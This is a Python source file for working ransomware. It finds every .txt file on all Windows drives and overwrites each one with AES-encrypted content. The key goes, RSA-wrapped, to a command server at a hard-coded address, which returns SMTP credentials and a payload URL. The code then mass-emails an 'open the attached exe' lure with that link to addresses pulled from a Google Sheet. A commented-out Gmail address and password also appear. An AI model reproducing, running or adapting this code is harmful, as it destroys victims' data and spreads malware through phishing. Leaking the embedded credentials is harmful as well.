import random
import os
# import string
from string import ascii_letters as string_ascii_letters
from string import digits as string_digits
# import win32api
from win32api import GetLogicalDriveStrings

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
# import base64
from base64 import b64encode, b64decode
import socket
import requests
# import csv
from csv import DictReader
import sys

# from dotenv import load_dotenv

import smtplib
from email.mime.multipart import MIMEMultipart

from email.mime.text import MIMEText


def waitingForKey(key, message="Enter the secret key to start the program: "):
    secret_key = key
    while True:
        user_input = input(message)
        if user_input == secret_key:
            print("Access granted! Starting the program...")
            break
        else:
            print("Incorrect key. Try again.")

def progress_bar(total, progress, length=40, label=''):
    filled_length = int(length * progress // total)
    bar = '#' * filled_length + '-' * (length - filled_length)
    percent = (progress / total) * 100
    sys.stdout.write('\r %s [%s] %.1f%%' % (label+'... :', bar, percent ))
    sys.stdout.flush()

def count_lines(file_path):
    with open(file_path, 'r') as file:
        line_count = sum(1 for line in file)
    return line_count

def generate_key(length):
    """Generate a random ASCII key of given length"""
    ascii_key = ''.join(random.choices(string_ascii_letters +string_digits, k=length))
    return ascii_key

def saveKey(key, filename):
    # Define the path to the desktop folder
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop_path):
        print(f"The desktop directory {desktop_path} does not exist!")
    else:
        content = key
        with open(os.path.join(desktop_path, filename), "w") as file:
            file.write(content)

def findRootDirsWindows():
    """Find the root directories in Windows"""
    drives = GetLogicalDriveStrings()
    roots = drives.split('\000')[:-1]
    return roots

def findTxtFileAndSaveThemTo(file_name):
    """Find all text files in the system and write their paths to a .txt file"""
    root_dirs = findRootDirsWindows()
    txtFileCounter = 0
    for root_dir in root_dirs:
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith(".txt"):
                    if file == file_name:
                        continue
                    file_path = os.path.join(root, file)
                    txtFileCounter += 1
                    print("Files Found: ", txtFileCounter, end='\r')
                    # Write file_path to a .txt file
                    with open(file_name, "a") as f:
                        f.write(file_path + "\n")
    print("\n")
    return txtFileCounter


def pad_data(data):
    """Pad the data to be 16-byte for encryption"""
    pad_len = 16 - (len(data) % 16)
    bytes_data = bytes([pad_len] * pad_len)
    my_bytes = data.encode()
    return my_bytes + bytes_data

def encrypt_data(key, data):
    """Encrypt the data using AES-CBC"""
    iv = os.urandom(16)
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad_data(data))
    msg = iv + encrypted_data
    return msg

def decrypt_data(key, encrypted_data):
    """Decrypt the data using AES-CBC"""
    iv = encrypted_data[:16]
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data[16:])
    return decrypted_data[:-decrypted_data[-1]]

def encrypt_file(ascii_key, file_path):
    if not os.path.exists(file_path):
        return
    try:
        with open(file_path, 'r') as f:
            data = f.read()
        encrypted_data = encrypt_data(ascii_key, data)
        with open(file_path, 'wb') as f:
            f.write( encrypted_data )
    except:
        pass


def decrypt_file(key, file_path):
    if not os.path.exists(file_path):
        return
    try:
        with open(file_path, "rb") as f:
            encrypted_data = f.read()
        decrypted_data = decrypt_data(key, encrypted_data)
        with open(file_path, 'wb') as f:
            f.write(decrypted_data)
    except:
        pass

def encrypt_file_paths(key, file_path):
    pathsCount = count_lines(file_path)
    counter = 0
    with open(file_path, "r") as f:
        for line in f:
            file_path = line.strip()
            encrypt_file(key, file_path)
            counter += 1
            progress_bar(pathsCount, counter, 50, 'Encrypting files')
    print("\n")

def decrypt_file_paths(key, file_path):
    pathsCount = count_lines(file_path)
    counter = 0
    with open(file_path, "r") as f:
        for line in f:
            file_path = line.strip()
            decrypt_file(key, file_path)
            counter += 1
            progress_bar(pathsCount, counter, 50, 'Decrypting files')
    print("\n")

def generateRSAKeys():
    """Generate an RSA key pair"""
    # Generate an RSA key pair with a key length of 2048 bits
    key = RSA.generate(2048)
    # should we use pkcs=8 to be able to have a consistent format for the both keys
    # check "https://stackoverflow.com/questions/18039401/how-can-i-transform-between-the-two-styles-of-public-key-format-one-begin-rsa"
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    #print("Private key:\n", private_key.decode())
    #print("\nPublic key:\n", public_key.decode())
    return  public_key, private_key

def encryptWithRSA(data, public_key):
    """Encrypt the data using RSA"""
    # Import the public key
    # key = RSA.import_key(public_key)
    # # Encrypt the data
    # encrypted_data = key.encrypt(data.encode(), 32)

    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_data = encryptor.encrypt(data)
    encoded_encrypted_msg = b64encode(encrypted_data)
    #print(encoded_encrypted_msg)
    return encoded_encrypted_msg 

def decrypt_with_RSA(ciphertext, private_key):
    """Decrypt the ciphertext using RSA"""
    # Create an instance of the PKCS1_OAEP decryption scheme using the private key
    key= RSA.import_key(private_key)
    decryptor = PKCS1_OAEP.new(key)
    # Decode the ciphertext from base64-encoded string to bytes
    ciphertext_bytes = b64decode(ciphertext)
    # Use the decryption scheme to decrypt the ciphertext
    plaintext_bytes = decryptor.decrypt(ciphertext_bytes)
    # Convert plaintext bytes to string and return
    return plaintext_bytes.decode('utf-8')


# def encryptWithRSA(data, public_key):
#     """Encrypt the data using RSA"""
#     # Create an instance of the PKCS1_OAEP encryption scheme using the public key
#     encryptor = PKCS1_OAEP.new(public_key)

#     # Convert the data string to bytes
   

#     # Use the encryption scheme to encrypt the data
#     ciphertext_bytes = encryptor.encrypt(data)

#     # Return the ciphertext as a base64-encoded string
#     return base64.b64encode(ciphertext_bytes)

def encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key):
    SERVER_IP = '10.0.2.2'
    SERVER_PORT = 5678
    with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        exported_public_key = s.recv(1024)
        public_key = RSA.import_key(exported_public_key)
        byte_ascii_key = ascii_key.encode()
        encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
        s.send(encoded_encrypted_msg)

        credentials = {}
        data = s.recv(1024).decode()
        credentials['smtp_email'] = data.split("\n")[0]
        credentials['smtp_password'] = data.split("\n")[1]
        payload_URL = data.split("\n")[2]
    return encoded_encrypted_msg, credentials, payload_URL

def get_emails_from_csv():
    url = "https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv"
    response = requests.get(url)
    # convert the data to a csv format
    data = DictReader(response.text.splitlines())
    # return only the emails
    emails = [row['Email'] for row in data]
    return emails

def send_to_emails(emails, credentials,  payload_url):
    
    
    subject = 'Sending an executable file'
    message = 'Please open the attached exe:' + payload_url
    msg = MIMEMultipart()
    
    
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    smtp_server = 'smtp.gmail.com'
    
    smtp_port = 587
    
    
    # smtp_username = 'gpt.rats@gmail.com'
    # smtp_password = 'mmtxdnfzzvckqrhw'

    smtp_email = credentials['smtp_email']
    sender_email = smtp_email

    smtp_password = credentials['smtp_password']

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_email, smtp_password)

    
    msg['From'] = sender_email
    # Send the email
    for email in emails:
        receiver_email = email
        msg['To'] = email
        server.sendmail(sender_email, receiver_email, msg.as_string())


    server.quit()
    